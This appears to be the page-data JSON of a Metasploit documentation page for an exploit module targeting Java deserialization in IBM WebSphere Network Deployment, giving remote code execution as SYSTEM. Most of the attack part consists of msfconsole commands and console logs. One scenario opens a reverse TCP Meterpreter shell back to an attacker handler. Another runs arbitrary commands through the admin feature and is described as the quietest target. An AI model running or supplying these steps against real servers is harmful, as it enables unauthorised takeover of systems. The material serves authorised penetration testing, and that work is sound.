{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/ibm/ibm_was_dmgr_java_deserialization_rce","result":{"data":{"moduleMetadataJson":{"id":"541c821f-f8e2-5ea1-924a-206ddf08b712","name":"IBM Websphere Application Server Network Deployment Untrusted Data Deserialization Remote Code Execution","fullname":"exploit/windows/ibm/ibm_was_dmgr_java_deserialization_rce","description":"This module exploits untrusted serialized data processed by the WAS DMGR Server and Cells.\n        NOTE: There is a required 2 minute timeout between attempts as the neighbor being added must be reset.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/ibm/ibm_was_dmgr_java_deserialization_rce","documentationSlug":"/modules/documentation/exploit/windows/ibm/ibm_was_dmgr_java_deserialization_rce","referencesSlug":"/modules/references/exploit/windows/ibm/ibm_was_dmgr_java_deserialization_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits the lack of proper authentication checks in IBM Websphere Application Server ND that allows for the execution of an\narbitrary command and upload of an arbitrary file as SYSTEM. The module serializes the required Java objects expected by the IBM Websphere server.</p>\n<p>The module affects <a href=\"https://www.ibm.com/support/knowledgecenter/en/SSAW57/mapfiles/product_welcome_wasnd.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">IBM Websphere Application Server Network Deployment</a>.\nThe agent is installed on servers with the network deployment feature and listens on TCP port 11002,11004, or 11006. The vulnerability affects versions up to 9.0.0.11.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>To use this exploit you will need access to IBM Websphere Application Server Network Deployment.</p>\n<ol>\n<li>Install the IBM Websphere Application Server Network Deployment on a host.</li>\n<li>Ensure that the service is running and listening on TCP port 11002, 11004, or 11006.</li>\n<li>Launch <code class=\"language-text\">msfconsole</code>.</li>\n<li>Load the module <code class=\"language-text\">use exploit/windows/ibm/ibm_was_dmgr_java_deserialization_rce</code>.</li>\n<li>Set the remote host ip to execute <code class=\"language-text\">set RHOSTS 192.168.162.133</code>.</li>\n<li>Set the command to execute <code class=\"language-text\">set CMD &quot;calc.exe&quot;</code>.</li>\n<li>Run the exploit <code class=\"language-text\">exploit</code>.</li>\n</ol>\n<p>The result should be that calc.exe is executed on the target machine.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>The exploit module contains several targets as detailed below.</p>\n<h3 id=\"target-0-windows-powershell-injected-shellcode\" style=\"position:relative;\"><a href=\"#target-0-windows-powershell-injected-shellcode\" aria-label=\"target 0 windows powershell injected shellcode permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Target 0: Windows Powershell Injected Shellcode</h3>\n<p>This module target provides support for command staging to enable arbitrary Metasploit payloads to be used against Windows targets (for example, a Meterpreter shell).</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/windows/ibm/ibm_was_dmgr_java_deserialization_rce\nmsf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) &gt; set rhosts 172.22.222.200\nrhosts =&gt; 172.22.222.200\nmsf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 172.22.222.136:4444 \n[*] 172.22.222.200:11006 - Connected to IBM WAS DMGR.\n[*] 172.22.222.200:11006 - Server responded\n[*] 172.22.222.200:11006 - Sending payload: FOAFKqEH.exe\n[*] Sending stage (179779 bytes) to 172.22.222.200\n[*] Meterpreter session 1 opened (172.22.222.136:4444 -&gt; 172.22.222.200:50575) at 2019-05-30 06:10:39 -0500\n[*] 172.22.222.200:11006 - Disconnected from IBM Websphere DMGR.\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : DESKTOP-IPOGIJR\nOS              : Windows 10 (Build 17763).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt; exit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"target-1-cmd\" style=\"position:relative;\"><a href=\"#target-1-cmd\" aria-label=\"target 1 cmd permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Target 1: CMD</h3>\n<p>This target isn't a formal target. It was added to allow a user to execute commands entirely through the IBM Websphere Application Network Deployment Server remote administration feature. It would be the most quiet of the targets as it does not create any additional connections or use powershell by default like Target 0.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/windows/ibm/ibm_was_dmgr_java_deserialization_rce\nmsf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) &gt; set rhosts 172.22.222.200\nrhosts =&gt; 172.22.222.200\nmsf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) &gt; set target 1\ntarget =&gt; 1\nmsf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) &gt; set payload cmd/windows/generic \npayload =&gt; cmd/windows/generic\nmsf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) &gt; set cmd &quot;ping -n 10 172.22.222.200&quot;\ncmd =&gt; ping -n 10 172.22.222.200\nmsf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) &gt; run\n\n[*] 172.22.222.200:11006 - Connected to IBM WAS DMGR.\n[*] 172.22.222.200:11006 - Server responded\n[*] 172.22.222.200:11006 - Executing command: ping -n 10 172.22.222.200\n[*] 172.22.222.200:11006 - Sending payload: uMuOTPtG.bat\n[*] 172.22.222.200:11006 - Disconnected from IBM Websphere DMGR.\n[*] Exploit completed, but no session was created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"541c821f-f8e2-5ea1-924a-206ddf08b712"}}}